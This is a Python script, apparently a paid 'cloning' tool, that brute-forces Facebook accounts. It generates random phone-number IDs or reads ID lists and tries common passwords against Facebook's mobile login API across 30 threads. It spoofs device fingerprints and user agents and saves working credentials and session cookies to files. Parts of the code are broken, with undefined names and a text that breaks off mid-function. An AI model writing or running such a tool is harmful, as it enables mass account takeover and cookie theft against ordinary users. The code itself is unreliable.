#__________________[ IMPORT ]__________________#
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#__________________[ LOOP ]__________________#
loop = 0
oks = []
cps = []
id = []
loop=0
oks=[]
cps=[]
ck=[]
ok=[]
user = []
#__________________[ PROXY ]__________________#
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
#__________________[ DATE ]__________________#
dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date ='\x1b[1;97m'+str(tgl)+'\x1b[1;97m/\x1b[1;97m'+str(bln)+'\x1b[1;97m/\x1b[1;97m'+str(thn)

#__________________[ SIM ID ]__________________#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Airtel'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Airtel"
                        sim_id+=fbcr
        else:
                fbcr = 'Airtel'
                sim_id+=fbcr
except:
        fbcr = "Airtel"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#__________________[ SIM NAME ]__________________#
try:
    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')
    ahydra = output.replace(',', '\x1b[38;5;46m  \x1b[1;97m').replace('\n', '')
except Exception as e:
    pass
    ahydra = None
#__________________[ COLOUR ]__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';W ='\033[1;37m';BE = "\x1b[1;35m"
cls = ["\x1b[38;5;196m","\x1b[38;5;14m","\x1b[1;35m"]
xo = random.choice(cls)
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2; X ° R X R \x07')
#__________________[ LOGO ]__________________#
logo = (f"""{W}
    ██████      ██   ██     ██████  
    ██   ██      ██ ██      ██   ██ 
    ██████        ███       ██████  
    ██   ██      ██ ██      ██   ██ 
    ██   ██     ██   ██     ██   ██ {X1}ＴＲＩＡＬ 
{M}[{W}●{M}]{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{M}[{W}●{M}]
      {W}[{M}●{W}] {R}≫ {G2}TODAY DATE {R}: {date} 
{M}[{W}●{M}]{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{M}[{W}●{M}]
      {W}[{M}≽{W}] {G2}DEVELOPER {R}⊣ {W}FUCK BY HABIB HOSSAIN X SWAG
      {W}[{M}≽{W}] {G2}VERSION   {R}⊣ {W}𝟶.𝟹
      {W}[{M}≽{W}] {G2}TOOL      {R}⊣ {W}FILE {R}✗ {W}RANDOM
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________[ LINE ]__________________#
def linex():print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def clear():os.system("clear");print(logo)
#__________________[ APPROVAL ]__________________#
urll =  "https://mr-rx-x1.blogspot.com/2024/04/hay.html?m=1"
XeX = urll
aplnk = XeX
buffer = BytesIO()
c = pycurl.Curl()
c.setopt(c.URL, aplnk)
c.setopt(c.WRITEDATA, buffer)
c.setopt(c.CAINFO, certifi.where())
c.perform()
try:c.perform()
except pycurl.error:exit(f"{W}[{M}●{W}] {R}PLEASE CHECK YOUR INTERNET CONNECTION ! ")
c.close()
body = buffer.getvalue().decode('utf-8')
link = body
def app():
    key = "5"+str(os.geteuid())+str(os.geteuid()).replace('u0_a','')+"_RX_"+str(os.geteuid())+str(os.getlogin()).replace('u0_a','')+"6"
    if key in link:
        clear();linex()
        print("")
        RAFAT()
    else:
        clear();linex()
        print(f"{W}[{M}●{W}] {G2}KEY : {W}{key}");linex()
        print(f"{W}[{M}●{W}] {G2}SEND KEY TO ADMIN FOR BUY THIS TOOL");linex()
        x = input(f"{W}[{M}●{W}] {G2}CHOOSE {R}:{W} ")
        if x in ['1','A']:os.system("xdg-open https://www.facebook.com/maliknai1234?mibextid=ZbWKwL");sleep(3);linex();exit()
#__________________[ MAIN ]__________________#
def RAFAT():
    clear()
    print(f"{W}[{M}1{W}] {G2}FILE CRACKING")
    print(f"{W}[{M}2{W}] {G2}RAMDOM CLONE")
    print(f"{W}[{M}3{W}] {G2}OLD CLONE")
    print(f"{W}[{M}4{W}] {G2}OWNER")
    print(f"{W}[{M}0{W}]{Y} EXIT TOOL")
    linex()
    xpx = input(f'{W}[{M}●{W}] {G2}SELECT {R}:{W} ')
    if xpx in ['A','a','01','1']:file()
    elif xpx in ['02','2']:bd()
    elif xpx in ['03','3']:old()
    elif xpx in ['04','4']:os.system('xdg-open https://www.facebook.com/maliknai1234?mibextid=ZbWKwL');os.system('python X-RAFAT.py')
    else:RAFAT()
#__________________[ OLD SYS ]__________________#  
def old():
       user=[]
       clear()
       print(f"{W}[{M}●{W}] {G2}LIMIT {R}: {W}3000 {R}>> {W}5000 {R}>> {W}10000")
       linex()
       limit=input(f'{W}[{M}●{W}] {G2}SELECT {R}:{W} ')
       os.system('clear')
       print(logo)
       print(f"{W}[{M}●{W}] {G2}SYSTEM {R}[{W}1{R}]")
       linex()
       ask=input(f'{W}[{M}●{W}] {G2}SELECT {R}:{W} ')
       if ask in["1"]:
          star="100000"
          for i in range(int(limit)):
              data=str(random.choice(range(100000000,999999999)))
              user.append(data)
       else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)    
       with tred(max_workers=30) as demon:
           os.system('clear')
           print(logo)
           print(f"{W}[{M}●{W}]{G2} TOTAL ID {R} :{W} {limit}")
           print(f"{W}[{M}●{W}]{G2} SIM{R} :{W} {ahydra}")
           print(f"{W}[{M}●{W}]{G2} IF NO RESULT{W} {G}ON{W} / {R}OFF{W} {G2} AIROPLANE MOOD ");linex()
           for mal in user:
              uid=star+mal
              demon.submit(login,uid)
#__________________[ RANDOM SYS ]__________________#  
def bd():
        user=[]
        clear()
        print(f"{W}[{M}●{W}] {G2}SIM CODE {R}: {W}017 {R}>> {W}018 {R}>> {W}019");linex()
        code = input(f'{W}[{M}●{W}] {G2}SELECT {R}:{W} ')
        clear();print(f"{W}[{M}●{W}] {G2}LIMIT {R}: {W}3000 {R}>> {W}5000 {R}>> {W}10000");linex()
        limit = int(input(f'{W}[{M}●{W}] {G2}SELECT {R}:{W} '))
        clear()
        print(f"{W}[{M}●{W}] {G2}SYSTEM {R}[{W}1{R}]")
        print(f"{W}[{M}●{W}] {G2}SYSTEM {R}[{W}2{R}]")
        linex()
        mthd = input(f'{W}[{M}●{W}] {G2}SELECT {R}:{W} ')
        for nmbr in range(limit):
            nmp=''.join(random.choice(string.digits) for _ in range(8))
            user.append(nmp)
        with tred(max_workers=30) as habib:    
            clear()
            tl = str(len(user))
            print(f"{W}[{M}●{W}]{G2} TOTAL ID {R} :{W} {tl}")
            print(f"{W}[{M}●{W}]{G2} SIM CODE{R} :{W} {code}")
            print(f"{W}[{M}●{W}]{G2} SIM{R} :{W} {ahydra}")
            print(f"{W}[{M}●{W}]{G2} IF NO RESULT{W} {G}ON{W} / {R}OFF{W} {G2} AIROPLANE MOOD ");linex()
            for psx in user:
                uid = code+psx
                passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                if mthd in ['1','01']:
                    habib.submit(rndm1,uid,passlist)
                if mthd in ['2','02']:
                    habib.submit(rndm2,uid,passlist)
        print("")
        linex()
        print(f'{W}[{M}●{W}] {G2}RANDOM CRACKING HAS BEEN COMPLETE....!')
        print(f'{W}[{M}●{W}] {G2}YOUR TOTAL [OK-IDS] {R}: {G}[{str(len(oks))}]')
        linex()
        input(f"{W}[{M}●{W}] {G2}PRESS ENTER TO BACK MENU....!");RAFAT()
#__________________[ FILE SYS ]__________________#  
def file():
    clear()
    print(f'{W}[{M}●{W}]{G2} FILE NAME {R}: {W}/sdcard/file.txt');linex()
    file = input(f'{W}[{M}●{W}] PUT FILE NAME  {R}:{W} ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{W}[{M}●{W}]{R}FILE NOT FOUND...');time.sleep(2);main();linex()
#__________________[ METHOD ]__________________#
    clear()
    print(f"{W}[{M}●{W}] {G2}SYSTEM {R}[{W}1{R}]")
    print(f"{W}[{M}●{W}] {G2}SYSTEM {R}[{W}2{R}]")
    linex()
#__________________[ PASS SYS ]__________________#
    mthd = input(f'{W}[{M}●{W}]{G2} SELECT {R}:{W}')
    plist=[];clear()
    try:
        ps_limit = int(input(f'{W}[{M}●{W}]{G2} PASS LIMIT {B}:{W} '))
    except:
        ps_limit =1
    clear()
    for i in range(ps_limit):
        plist.append(input(f'{W}[{R}{i+1}{W}] {G2} PASSWORD  {R}:{W} '))
    with tred(max_workers=30) as RAY:
        clear()
        tl = str(len(fo))
        print(f"{W}[{M}●{W}]{G2} TOTAL ID {R} :{W} {tl}")
        print(f"{W}[{M}●{W}]{G2} METHOD{R} :{W} S{mthd}")
        print(f"{W}[{M}●{W}]{G2} SIM{R} :{W} {ahydra}")
        print(f"{W}[{M}●{W}]{G2} IF NO RESULT{W} {G}ON{W} / {R}OFF{W} {G2} AIROPLANE MOOD ");linex()
        for user in fo:
                    ids,names = user.split('|')
                    passlist = plist
                    if mthd =='1':
                        RAY.submit(m1,ids,names,passlist)
                    elif mthd =='2':
                        RAY.submit(m2,ids,names,passlist)
#__________________[ USER AGENT ]__________________#
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
    
get_uapx_list = requests.get("https://raw.githubusercontent.com/MR-XEON/RX-PRO/main/RND.txt").text.splitlines()
#__________________[ METHOD-1]__________________#
def m1(ids,names,passlist):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r  {W}[{M}●{W}]{R}―{W}[{G2}FILE-S1{W}]{R}―{W}[{Y}%s{W}]{R}―{W}[{G}OK:%s{W}]{R}'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            fs = names.split(' ')[0]
            try:
                ls = names.split(' ')[1]
            except:
                ls = fs
            for pw in passlist:
                pas = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',names).replace('name',names.lower())
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                fbbv = str(random.randint(111111111,999999999))
                android_version = device['android_version']
                model = device['model']
                build = device['build']
                fblc = device['fblc']
                fbcr = sim_id
                fbmf = device['fbmf']
                fbbd = device['fbbd']
                fbdv = device['fbdv']
                fbsv = device['fbsv'] 
                fbca = device['fbca']
                fbdm = device['fbdm']
                fbfw = '1'
                fbrv = '0'
                bafbou = "[FBAN/FB4A;FBAV/361.0.0.4168;FBBV/7878895;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184959;FBDM/{density=1.875,width=720,height=1475};FBLC/en_US;FBRV/348936652;FBCR/null;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2111;FBSV/11;FBOP/1;FBCA/arm64-v8a:]"
                fban = 'FB4A'
                fbpn = 'com.facebook.katana'
                en = random.choice(['en_US','en_GB'])
                cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                frng ='Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/;FBBD/;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": pas,
                    "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random.choice(get_uapx_list),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]) #X-RAYb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={X-RAYb};{ckkk}"
                    print(f"\r\r{W}[{M}●{W}]{R}―{W}[{G}OK{W}] {R}:  {G2}{ids} {A}| {G2}{pas} ")
                    print(f'\r\r{W}[{M}●{W}]{R}―{W}[{G}COOKIE{W}]{R} : {W} '+ckkk)
                    oks.append(ids)
                    open('/sdcard/RAFAT-OK-S1.txt','a').write(ids+'|'+pas+'|'+ckkk+'\n')
                    break
                	#print(f"\r[X-RAY-CP] {sid} | {ps} {S}")
                    cps.append(ids)
                    open('/sdcard/RAFAT-CP-M1.txt','a').write(ids+'|'+pas+'\n')
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:
            m1(ids,names,passlist)
#__________________[ METHOD-2 ]__________________#
def m2(ids,names,passlist):
    sys.stdout.write(f'\r\r  {W}[{M}●{W}]{R}―{W}[{G2}FILE-S2{W}]{R}―{W}[{Y}%s{W}]{R}―{W}[{G}OK:%s{W}]{R}'%(loop,len(oks)));sys.stdout.flush()
    for pw in pwd_list:
        try:
            pw = pw.replace("first", first).replace("last", last)
            pw = pw.replace("First", first.capitalize()).replace("Last", last.capitalize())
            quality = random.choice(['POOR', 'MODERATE', 'GOOD', 'EXCELLENT'])
            headers={
                                "Accept-Encoding": "gzip, deflate",
"Accept": "*/*",
"Connection": "keep-alive",
"User-Agent": random.choice(get_ua_list),
"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"X-FB-Friendly-Name": "authenticate",
"X-FB-Connection-Type": "unknown",
"Content-Type": "application/x-www-form-urlencoded",
"X-FB-HTTP-Engine": "Liger",
"Content-Length": "329",}
            data = {
                                "adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"email": uid,
"password": pw,
"generate_analytics_claims": "1",
"credentials_type": "password",
"source": "login",
"enroll_misauth": "false",
"generate_session_cookies": "1",
"generate_machine_id": "1",
"fb_api_req_friendly_name": "authenticate",}
            response = requests.post('https://b-graph.facebook.com/auth/login',headers=headers,data=data,allow_redirects=False)
            response_data = json.loads(response.text)
            if "session_key" in str(response.text):
                if uid not in oks:
                    token = response_data['access_token']
                    cookie = ";".join(i["name"] + "=" + i["value"] for i in response_data["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{cookie}"
                    print(f"\r\r{W}[{M}●{W}]{R}―{W}[{G}OK{W}] {R}:  {G2} {uid}{R} |{G2} {pw} ")
                    print(f'\r\r{W}[{M}●{W}]{R}―{W}[{G}COOKIE{W}]{R} : {W}{cookie}\n')
                    open('/sdcard/RAFAT-FILE-OK-txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                    oks.append(uid)
                break
            elif "User must verify their account" in str(response.text):
                if uid not in cps:
                   # print(f'\\x1b[38;5;196m[Checkpoint] {uid} | {pw} {white}')
                    open('/sdcard/RAFAT-FILE-CP.txt','a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
                break
            else:continue
        except requests.exceptions.ConnectionError as e:time.sleep(20);continue
        
    cracked.append(uid)
#───────────────[ OLD - CLONE - METHOD ]───────────────#
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r  {W}[{W}●{W}]{R}―{W}[{G2}OLD-S1{W}]{R}―{W}[{Y}%s{W}]{R}―{W}[{G}OK:%s{W}]{R}'%(loop,len(oks)));sys.stdout.flush()
        sys.stdout.flush()
        for pw in ["654321", "123456","1234567","12345678","123456789","123123","11111111","112233","1234567890"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": windows(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r{W}[{M}●{W}]{R}―{W}[{G}OK{W}] {R}:  {G2}{uid} {A}| {G2}{pw} ")
                open("/sdcard/RAFAT-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:          	
            	print(f"\r\r{W}[{M}●{W}]{R}―{W}[{G}OK{W}] {R}:  {G2}{uid} {A}| {G2}{pw} ")
            	open("/sdcard/RAFAT-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            elif "Please Confirm Email" in str(rp):            
            	print(f"\r\r{W}[{M}●{W}]{R}―{W}[{G}OK{W}] {R}:  {G2}{uid} {A}| {G2}{pw} ")
            	open("/sdcard/RAfat-2f.txt","a").write(uid+"|"+pw+"\n")
            	cps.append(uid)
            	break
            else:continue
        loop+=1
    except:pass
#__________________[ METHOD-RND ]__________________#
def rndm1(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r  {W}[{M}●{W}]{R}―{W}[{G2}R X R-S1{W}]{R}―{W}[{Y}%s{W}]{R}―{W}[{G}OK:%s{W}]{R}'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                "sim_country": "id",
                                "network_country": "id",
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent': '[FBAN/FB4A;FBAV/461.0.0.0.73;FBBV/451208771;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/Meteor;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1039;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        k = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}"
                                        resp = requests.get(k).text
                                        if 'live' in resp:
                                            print(f"\r\r{W}[{M}●{W}]{R}―{W}[{G}OK{W}] {R}:  {G2}{uid} {A}| {G2}{pas} ")
                                            print(f'\r\r{W}[{M}●{W}]{R}―{W}[{G}COOKIE{W}]{R} : {W} '+coki)
                                            open('/sdcard/RAFAT-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                            oks.append(uid)
                                            break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f"\r\r{W}[{M}●{W}]{R}―{W}[{G}OK{W}] {R}:  {R}{uid} {A}| {G2}{pas} ")
                                                open('/sdcard/RAFAT-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M2 |__________________#
def rndm2(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r  {W}[{M}●{W}]{R}―{W}[{G2}R X R-S2{W}]{R}―{W}[{Y}%s{W}]{R}―{W}[{G}OK:%s{W}]{R}'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
